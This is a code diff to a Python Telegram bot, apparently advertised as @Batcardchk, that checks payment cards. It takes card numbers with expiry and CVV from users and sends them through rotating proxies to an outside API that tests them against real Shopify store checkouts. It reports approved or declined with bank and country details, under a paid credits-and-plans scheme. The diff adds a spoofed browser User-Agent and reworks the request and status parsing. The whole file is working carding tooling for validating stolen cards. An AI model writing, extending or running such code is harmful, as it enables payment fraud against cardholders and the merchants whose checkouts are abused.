@@ -7,12 +7,13 @@ import random
 from html import escape
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import CommandHandler, ContextTypes
-from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK, API_TIMEOUT
+from config import get_bin_info, kb_result, OWNER_ID, FORCE_CHANNELS, SUPPORT_LINK
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # 🛒 SHOPIFY API CONFIG
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 SHOPII_API_BASE = "https://goshopi.up.railway.app/shopii"
+REQUEST_TIMEOUT  = 90   # seconds — long enough for real site checks
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # SITES & PROXY LOADERS
@@ -20,7 +21,7 @@ SHOPII_API_BASE = "https://goshopi.up.railway.app/shopii"
 def load_sites():
     try:
         with open("sites.txt", "r") as f:
-            sites = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
         if sites:
             return sites
     except FileNotFoundError:
@@ -30,11 +31,11 @@ def load_sites():
 def load_proxies():
     try:
         with open("px.txt", "r") as f:
-            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
+            return [l.strip() for l in f if l.strip() and not l.startswith("#")]
     except FileNotFoundError:
         return []
 
-SITES = load_sites()
+SITES   = load_sites()
 PROXIES = load_proxies()
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -63,11 +64,11 @@ def is_user_premium(ud: dict) -> bool:
     return True
 
 def get_styled_plan(raw_plan: str) -> str:
-    plan_upper = raw_plan.upper()
-    if plan_upper == "CORE":    return "✨ Cᴏʀᴇ ✨"
-    elif plan_upper == "ELITE": return "⭐ Eʟɪᴛᴇ ⭐"
-    elif plan_upper == "ROOT":  return "👑 Rᴏᴏᴛ 👑"
-    else: return "Tʀɪᴀʟ"
+    p = raw_plan.upper()
+    if p == "CORE":   return "✨ Cᴏʀᴇ ✨"
+    if p == "ELITE":  return "⭐ Eʟɪᴛᴇ ⭐"
+    if p == "ROOT":   return "👑 Rᴏᴏᴛ 👑"
+    return "Tʀɪᴀʟ"
 
 async def _check_force_sub(user_id: int, context) -> list:
     if user_id == OWNER_ID:
@@ -83,78 +84,65 @@ async def _check_force_sub(user_id: int, context) -> list:
     return not_joined
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-# SHOPIFY API CHECKER (via goshopi.up.railway.app)
+# API CALL — hits real site, returns real response
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-def full_raw(raw) -> str:
-    """Always return the full, unmodified API response string."""
-    if isinstance(raw, dict):
-        return json.dumps(raw, ensure_ascii=False)
-    return str(raw)
+async def call_shopii_api(cc: str, month: str, year: str, cvv: str,
+                          site: str, proxy: str | None) -> str:
+    """
+    Makes the real HTTP request to goshopi API.
+    Returns the raw response string exactly as the API sent it.
+    Raises on timeout or connection error (caller handles these).
+    """
+    if len(year) == 2:
+        year = "20" + year
+
+    params = {"cc": f"{cc}|{month}|{year}|{cvv}", "site": site}
+    if proxy:
+        params["proxy"] = proxy
+
+    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                      "AppleWebKit/537.36 (KHTML, like Gecko) "
+                      "Chrome/124.0.0.0 Safari/537.36"
+    }
+
+    async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
+        async with session.get(SHOPII_API_BASE, params=params) as resp:
+            raw_text = await resp.text()
+            try:
+                parsed = json.loads(raw_text)
+                return json.dumps(parsed, ensure_ascii=False)
+            except Exception:
+                return raw_text.strip()
 
 
-def classify_response(raw) -> tuple[str, str]:
+def classify_status(raw_text: str) -> str:
     """
-    Returns ("APPROVED", full_api_response) or ("DECLINED", full_api_response).
-    Display is always the complete real API response — never filtered or shortened.
-    Status label is determined only by keyword scan.
+    Returns "APPROVED", "DECLINED", or "UNKNOWN".
+    Never assumes — only reads what the API actually said.
     """
-    raw_str = json.dumps(raw).lower() if isinstance(raw, dict) else str(raw).lower()
-    display = full_raw(raw)
+    t = raw_text.lower()
 
     approve_kw = [
         "approved", "approval", "success", "charged", "captured",
-        "transaction approved", "payment approved"
+        "transaction approved", "payment approved", "paid"
     ]
     decline_kw = [
         "declined", "decline", "card declined", "failed", "failure",
         "insufficient", "do not honor", "invalid card", "expired",
-        "incorrect cvc", "stolen", "blocked", "error"
+        "incorrect cvc", "stolen", "blocked", "do_not_honor",
+        "card_declined", "generic_decline"
     ]
 
     for kw in approve_kw:
-        if kw in raw_str:
-            return "APPROVED", display
-
+        if kw in t:
+            return "APPROVED"
     for kw in decline_kw:
-        if kw in raw_str:
-            return "DECLINED", display
+        if kw in t:
+            return "DECLINED"
 
-    # Unknown response — show full raw, treat as declined
-    return "DECLINED", display
-
-
-async def check_via_api(cc: str, month: str, year: str, cvv: str,
-                        site: str | None, proxy: str | None) -> tuple[str, str, str]:
-    """
-    Calls the goshopi API and returns (status, display_response, site_used).
-    status is "APPROVED" or "DECLINED".
-    """
-    # API expects full 4-digit year
-    if len(year) == 2:
-        year = "20" + year
-
-    cc_param = f"{cc}|{month}|{year}|{cvv}"
-    params: dict = {"cc": cc_param}
-
-    site_used = site or random.choice(SITES)
-    params["site"] = site_used
-
-    if proxy:
-        params["proxy"] = proxy
-
-    timeout = aiohttp.ClientTimeout(total=API_TIMEOUT if API_TIMEOUT else 60)
-
-    async with aiohttp.ClientSession(timeout=timeout) as session:
-        async with session.get(SHOPII_API_BASE, params=params) as resp:
-            try:
-                data = await resp.json(content_type=None)
-            except Exception:
-                text = await resp.text()
-                data = text.strip()
-
-    status, msg = classify_response(data)
-    return status, msg, site_used
-
+    return "UNKNOWN"
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # /sh COMMAND HANDLER
@@ -203,9 +191,9 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if match:
             card_str = f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
         else:
-            match = re.search(r'\b(\d{13,19})\b', replied_text)
-            if match:
-                card_str = match.group(1)
+            m2 = re.search(r'\b(\d{13,19})\b', replied_text)
+            if m2:
+                card_str = m2.group(1)
 
     if not card_str:
         await update.message.reply_text(
@@ -225,7 +213,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cc_num, mm, yy, cvv = [p.strip() for p in parts]
 
     # ── Credits check ──
-    ud = get_user_data(user.id, context)
+    ud      = get_user_data(user.id, context)
     premium = is_user_premium(ud)
 
     if not premium:
@@ -245,44 +233,53 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         ud["credits"] -= 1
 
+    site_used = random.choice(SITES)
+    proxy     = random.choice(PROXIES) if PROXIES else None
+
     msg = await update.message.reply_text(
-        "⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>",
+        f"⏳ <b>[ 𖥷iТ ] ➺ Cʜᴇᴄᴋɪɴɢ Sʜᴏᴘɪꜰʏ...</b>\n"
+        f"<code>🌐 {escape(site_used)}</code>",
         parse_mode="HTML"
     )
     start_time = time.time()
-    bin_num = cc_num[:6]
-    proxy = random.choice(PROXIES) if PROXIES else None
+    bin_num    = cc_num[:6]
 
     try:
-        # Run API check and BIN lookup concurrently
+        # Run real API call and BIN lookup at the same time
         api_task = asyncio.create_task(
-            check_via_api(cc_num, mm, yy, cvv, site=None, proxy=proxy)
+            call_shopii_api(cc_num, mm, yy, cvv, site_used, proxy)
         )
         bin_task = asyncio.create_task(get_bin_info(bin_num))
 
-        status, raw_response, site_used = await api_task
-        bin_data = await bin_task
+        raw_response = await api_task   # full real API response
+        bin_data     = await bin_task
 
-        # ── Status label ──
-        status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅" if status == "APPROVED" else "Dᴇᴄʟɪɴᴇᴅ ❌"
+        # Status from real response only — never assumed
+        status = classify_status(raw_response)
+
+        if status == "APPROVED":
+            status_ui = "Aᴘᴘʀᴏᴠᴇᴅ ✅"
+        elif status == "DECLINED":
+            status_ui = "Dᴇᴄʟɪɴᴇᴅ ❌"
+        else:
+            status_ui = "Uɴᴋɴᴏᴡɴ ⚠️"
 
         # ── BIN info ──
         bin_txt = "N/A"
         country = "N/A"
-        flag = ""
+        flag    = ""
         if not bin_data.get("error"):
-            s = str(bin_data.get("scheme", "N/A")).upper()
-            t = str(bin_data.get("type", "N/A")).upper()
-            b = bin_data.get("bank", "N/A")
+            s       = str(bin_data.get("scheme",  "N/A")).upper()
+            t       = str(bin_data.get("type",    "N/A")).upper()
+            b       = bin_data.get("bank", "N/A")
             country = str(bin_data.get("country", "N/A")).upper()
-            flag = bin_data.get("country_emoji", "")
+            flag    = bin_data.get("country_emoji", "")
             bin_txt = f"{s} - {t} - {b}"
 
         time_taken = f"{time.time() - start_time:.2f}"
-        plan_ui = get_styled_plan(ud.get("plan", "TRIAL").upper())
-        username = user.first_name or "User"
-
-        safe_response = escape(str(raw_response))
+        plan_ui    = get_styled_plan(ud.get("plan", "TRIAL").upper())
+        username   = user.first_name or "User"
+        safe_resp  = escape(raw_response)
         safe_proxy = escape(proxy if proxy else "None")
 
         text = (
@@ -290,15 +287,15 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔍 ➺ <code>{escape(card_str)}</code>\n"
             f"Gᴀᴛᴇ ➺ Sʜᴏᴘɪꜰʏ 🛒 🟢\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🌐 𝗦𝗜𝗧𝗘 ➺ {escape(site_used)}\n"
+            f"🌐 𝗦𝗜𝗧𝗘  ➺ {escape(site_used)}\n"
             f"🔒 𝗣𝗥𝗢𝗫𝗬 ➺ {safe_proxy}\n"
-            f"📜 𝗥𝗘𝗦𝗣 ➺ {safe_response}\n"
-            f"⏱️ 𝗧𝗜𝗠𝗘 ➺ {time_taken}s\n"
+            f"📜 𝗥𝗘𝗦𝗣  ➺ {safe_resp}\n"
+            f"⏱️ 𝗧𝗜𝗠𝗘  ➺ {time_taken}s\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🏦 𝗕𝗜𝗡 ➺ {bin_txt}\n"
+            f"🏦 𝗕𝗜𝗡    ➺ {bin_txt}\n"
             f"🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬 ➺ {flag} {country}\n"
             f"━━━━━━━━━━━━━━━━━\n"
-            f"🦇 𝗨𝘀𝗲𝗿 ➺ {escape(username)} ({plan_ui})\n"
+            f"🦇 𝗨𝘀𝗲𝗿  ➺ {escape(username)} ({plan_ui})\n"
             f"📢 @Batcardchk"
         )
 
@@ -315,8 +312,19 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(
             "<b>[ 𖥷iТ ] ➺ Tɪᴍᴇᴏᴜᴛ ❌</b>\n"
             "━━━━━━━━━━━━━━━━━\n"
-            "API took too long. Try again.\n"
+            "The site took too long to respond. Try again or use a different site.\n"
             "━━━━━━━━━━━━━━━━━",
+            parse_mode="HTML"
+        )
+
+    except aiohttp.ClientError as e:
+        if not premium:
+            ud["credits"] = ud.get("credits", 0) + 1
+        await msg.edit_text(
+            f"<b>[ 𖥷iТ ] ➺ Cᴏɴɴᴇᴄᴛɪᴏɴ Eʀʀᴏʀ ❌</b>\n"
+            f"━━━━━━━━━━━━━━━━━\n"
+            f"<code>{escape(str(e)[:200])}</code>\n"
+            f"━━━━━━━━━━━━━━━━━",
             parse_mode="HTML"
         )
 
